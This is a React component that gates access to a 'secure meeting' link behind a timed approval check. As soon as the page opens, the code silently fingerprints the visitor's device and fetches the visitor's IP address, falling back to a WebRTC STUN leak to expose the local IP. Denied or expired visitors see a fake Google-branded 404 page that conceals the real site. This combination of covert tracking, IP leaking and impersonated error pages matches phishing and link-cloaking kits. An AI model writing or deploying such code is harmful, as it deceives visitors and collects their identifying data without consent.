import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import SecureMeeting from './SecureMeeting';

function LinkApproval({ approvedLinks }) {
  const { token } = useParams();
  const [status, setStatus] = useState('loading'); // 'loading', 'approved', 'denied', 'expired'
  const [timeLeft, setTimeLeft] = useState(60);
  const [overallTimeExpired, setOverallTimeExpired] = useState(false);

  useEffect(() => {
    // Set overall timeout for 5 minutes (300 seconds)
    const overallTimeout = setTimeout(() => {
      setOverallTimeExpired(true);
      setStatus('expired');
    }, 300000); // 5 minutes

    // Check if already approved (including localStorage)
    const savedApproved = localStorage.getItem('approvedLinks');
    const approvedSet = savedApproved ? new Set(JSON.parse(savedApproved)) : new Set();
    
    if (approvedLinks.has(token) || approvedSet.has(token)) {
      setStatus('approved');
      clearTimeout(overallTimeout);
      return;
    }

    // Start countdown timer
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          setStatus('denied');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Auto-create pending request with real device info
    setTimeout(async () => {
      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine
      };
      
      // Get real IP address
      let realIP = 'Unknown';
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        realIP = data.ip;
      } catch (error) {
        // Fallback to WebRTC method
        try {
          const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
          pc.createDataChannel('');
          const offer = await pc.createOffer();
          await pc.setLocalDescription(offer);
          
          pc.onicecandidate = (event) => {
            if (event.candidate) {
              const candidate = event.candidate.candidate;
              const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
              if (ipMatch) {
                realIP = ipMatch[1];
                pc.close();
              }
            }
          };
        } catch (e) {
          realIP = `Local-${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }
      }
      
      const event = new CustomEvent('linkAccessAttempt', {
        detail: {
          id: Date.now(),
          token,
          link: window.location.href,
          requestedBy: 'Anonymous User',
          requestedAt: new Date().toLocaleString(),
          purpose: 'Secure Meeting Access',
          status: 'pending',
          ipAddress: realIP,
          deviceInfo
        }
      });
      window.dispatchEvent(event);
    }, 100);

    // Check for approval/denial every second (including localStorage)
    const approvalCheck = setInterval(() => {
      if (overallTimeExpired) {
        setStatus('expired');
        clearInterval(approvalCheck);
        clearInterval(timer);
        return;
      }
      
      const savedApproved = localStorage.getItem('approvedLinks');
      const approvedSet = savedApproved ? new Set(JSON.parse(savedApproved)) : new Set();
      
      const savedRequests = localStorage.getItem('linkRequests');
      const requests = savedRequests ? JSON.parse(savedRequests) : [];
      const currentRequest = requests.find(req => req.token === token);
      
      if (approvedLinks.has(token) || approvedSet.has(token) || (currentRequest && currentRequest.status === 'approved')) {
        setStatus('approved');
        clearInterval(approvalCheck);
        clearInterval(timer);
      } else if (currentRequest && currentRequest.status === 'denied') {
        setStatus('denied');
        clearInterval(approvalCheck);
        clearInterval(timer);
      }
    }, 500);

    return () => {
      clearInterval(timer);
      clearInterval(approvalCheck);
      clearTimeout(overallTimeout);
    };
  }, [token, approvedLinks]);

  if (status === 'loading') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4">
        <div className="text-center max-w-sm w-full">
          <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <h2 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">Verifying Access...</h2>
          <p className="text-gray-600 mb-4 text-sm sm:text-base">Please wait while we authenticate your request</p>
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <p className="text-sm text-blue-800">
              Time remaining: <span className="font-mono font-bold">{timeLeft}s</span>
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (status === 'denied' || status === 'expired') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center font-sans px-4">
        <div className="text-center max-w-md w-full">
          <div className="mb-8">
            <img 
              src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0MCIgZmlsbD0iIzRmNDZlNSIvPjx0ZXh0IHg9IjUwIiB5PSI1OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjM2IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RzwvdGV4dD48L3N2Zz4="
              alt="Google"
              className="mx-auto mb-6 w-16 h-16 sm:w-20 sm:h-20"
            />
          </div>
          <h1 className="text-4xl sm:text-6xl font-normal text-gray-500 mb-6">404</h1>
          <p className="text-lg sm:text-xl text-gray-600 mb-4">That's an error.</p>
          <p className="text-gray-600 mb-8 text-sm sm:text-base">
            The requested URL was not found on this server. <em>That's all we know.</em>
          </p>
        </div>
      </div>
    );
  }

  if (status === 'approved' && !overallTimeExpired) {
    return <SecureMeeting token={token} />;
  }

  // Default 404 for any other case
  return (
    <div className="min-h-screen bg-white flex items-center justify-center font-sans px-4">
      <div className="text-center max-w-md w-full">
        <div className="mb-8">
          <img 
            src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0MCIgZmlsbD0iIzRmNDZlNSIvPjx0ZXh0IHg9IjUwIiB5PSI1OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjM2IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RzwvdGV4dD48L3N2Zz4="
            alt="Google"
            className="mx-auto mb-6 w-16 h-16 sm:w-20 sm:h-20"
          />
        </div>
        <h1 className="text-4xl sm:text-6xl font-normal text-gray-500 mb-6">404</h1>
        <p className="text-lg sm:text-xl text-gray-600 mb-4">That's an error.</p>
        <p className="text-gray-600 mb-8 text-sm sm:text-base">
          The requested URL was not found on this server. <em>That's all we know.</em>
        </p>
      </div>
    </div>
  );
}

export default LinkApproval;